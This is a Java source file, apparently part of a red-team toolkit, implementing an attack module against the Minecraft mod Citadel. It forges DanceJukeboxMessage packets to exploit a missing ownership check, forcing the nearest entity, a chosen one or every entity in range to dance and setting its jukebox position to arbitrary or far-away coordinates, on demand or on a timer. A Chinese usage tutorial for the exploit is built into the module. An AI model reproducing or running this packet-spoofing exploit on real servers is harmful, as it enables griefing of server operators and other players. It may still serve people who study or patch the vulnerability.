package com.redblue.red.modules.citadel;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.LivingEntity;
import net.minecraftforge.fml.ModList;

import java.util.ArrayList;
import java.util.List;

/**
 * CITADEL-03: Entity ID spoofing via DanceJukeboxMessage.
 *
 * Server handler resolves entity by client-provided entityID with no
 * ownership or distance check. Can force any IDancesToJukebox entity
 * to start/stop dancing and set its jukebox position to arbitrary coords.
 *
 * Wire format (after discriminator byte 3):
 *   writeInt(entityID)          -- 4 bytes
 *   writeBoolean(dance)         -- 1 byte
 *   writeBlockPos(jukeBox)      -- writeLong(pos.asLong()) = 8 bytes
 */
public class CTD03_DanceSpoof implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("citadel", "main_channel");
    private static final int IDX_DANCE_JUKEBOX = 3;

    private long lastTick = 0;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("target_mode", "目标模式",
                "NEAREST", "NEAREST", "BY_ID", "ALL_IN_RANGE"),
        ConfigParam.ofEntity("target_entity_id", "目标实体(手动模式)")
                .visibleWhen("target_mode", "BY_ID"),
        ConfigParam.ofFloat("range", "范围", 64f, 1f, 256f)
                .visibleWhen("target_mode", "NEAREST", "ALL_IN_RANGE"),
        ConfigParam.ofBool("dance", "强制跳舞", true),
        ConfigParam.ofEnum("jukebox_mode", "唱片机坐标模式",
                "CURRENT", "CURRENT", "CUSTOM", "FAR_AWAY"),
        ConfigParam.ofInt("jukebox_x", "唱片机X", 0, -30000000, 30000000)
                .visibleWhen("jukebox_mode", "CUSTOM"),
        ConfigParam.ofInt("jukebox_y", "唱片机Y", 64, -64, 320)
                .visibleWhen("jukebox_mode", "CUSTOM"),
        ConfigParam.ofInt("jukebox_z", "唱片机Z", 0, -30000000, 30000000)
                .visibleWhen("jukebox_mode", "CUSTOM"),
        ConfigParam.ofAction("fill_pos", "填充当前坐标", () -> {
            var mc = Minecraft.getInstance();
            if (mc.player != null) {
                getParam("jukebox_x").ifPresent(p -> p.set((int) mc.player.getX()));
                getParam("jukebox_y").ifPresent(p -> p.set((int) mc.player.getY()));
                getParam("jukebox_z").ifPresent(p -> p.set((int) mc.player.getZ()));
            }
        }).visibleWhen("jukebox_mode", "CUSTOM"),
        ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
    );

    @Override public String id() { return "ctd03_dance_spoof"; }
    @Override public String name() { return "强制跳舞"; }
    @Override public String description() {
        return "强制任意IDancesToJukebox实体跳舞";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 启用模块\n"
            + "2. 选择目标模式：NEAREST(最近实体)、BY_ID(指定实体)、ALL_IN_RANGE(范围内全部)\n"
            + "3. 设置是否强制跳舞\n"
            + "4. 选择唱片机坐标模式：CURRENT(当前位置)、CUSTOM(自定义坐标)、FAR_AWAY(极远坐标)\n"
            + "5. 点击执行或启用自动模式\n\n"
            + "[参数说明]\n"
            + "目标模式：选择目标的方式\n"
            + "  NEAREST — 自动选取范围内最近的实体\n"
            + "  BY_ID — 手动指定目标实体\n"
            + "  ALL_IN_RANGE — 对范围内所有实体生效\n"
            + "目标实体(手动模式)：BY_ID 模式下，用准星选取或手动输入目标实体\n"
            + "范围：扫描实体的最大距离(格)\n"
            + "强制跳舞：开启则强制跳舞，关闭则停止跳舞\n"
            + "唱片机坐标模式：决定唱片机位置的方式\n"
            + "  CURRENT — 使用玩家当前坐标\n"
            + "  CUSTOM — 使用下方自定义的 X/Y/Z 坐标\n"
            + "  FAR_AWAY — 使用极远坐标\n"
            + "唱片机X/Y/Z：CUSTOM 模式下的自定义坐标\n"
            + "自动间隔(tick)：自动模式下每次执行的间隔";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("citadel");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        doAttack(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doAttack(mc);
    }

    private void doAttack(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        boolean dance = getParam("dance").map(ConfigParam::getBool).orElse(true);
        BlockPos jukeboxPos = resolveJukeboxPos(mc);
        List<Integer> targets = collectTargets(mc);

        for (int entityId : targets) {
            sendDanceMessage(entityId, dance, jukeboxPos);
        }
    }

    private BlockPos resolveJukeboxPos(Minecraft mc) {
        String mode = getParam("jukebox_mode").map(ConfigParam::getString)
                .orElse("CURRENT");
        return switch (mode) {
            case "CUSTOM" -> new BlockPos(
                getParam("jukebox_x").map(ConfigParam::getInt).orElse(0),
                getParam("jukebox_y").map(ConfigParam::getInt).orElse(64),
                getParam("jukebox_z").map(ConfigParam::getInt).orElse(0)
            );
            case "FAR_AWAY" -> new BlockPos(29999999, 320, 29999999);
            default -> mc.player.blockPosition();
        };
    }

    private List<Integer> collectTargets(Minecraft mc) {
        List<Integer> ids = new ArrayList<>();
        String mode = getParam("target_mode").map(ConfigParam::getString)
                .orElse("NEAREST");
        float range = getParam("range").map(ConfigParam::getFloat).orElse(64f);

        switch (mode) {
            case "BY_ID" -> {
                int id = getParam("target_entity_id")
                        .map(ConfigParam::getInt).orElse(-1);
                if (id > 0) ids.add(id);
            }
            case "NEAREST" -> {
                double best = Double.MAX_VALUE;
                int bestId = -1;
                for (Entity e : mc.level.entitiesForRendering()) {
                    if (e == mc.player) continue;
                    if (!(e instanceof LivingEntity)) continue;
                    double d = mc.player.distanceTo(e);
                    if (d <= range && d < best) {
                        best = d;
                        bestId = e.getId();
                    }
                }
                if (bestId >= 0) ids.add(bestId);
            }
            case "ALL_IN_RANGE" -> {
                for (Entity e : mc.level.entitiesForRendering()) {
                    if (e == mc.player) continue;
                    if (!(e instanceof LivingEntity)) continue;
                    if (mc.player.distanceTo(e) <= range) {
                        ids.add(e.getId());
                    }
                }
            }
        }
        return ids;
    }

    private void sendDanceMessage(int entityId, boolean dance, BlockPos pos) {
        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_DANCE_JUKEBOX);
            buf.writeInt(entityId);
            buf.writeBoolean(dance);
            buf.writeBlockPos(pos);
        });
    }
}
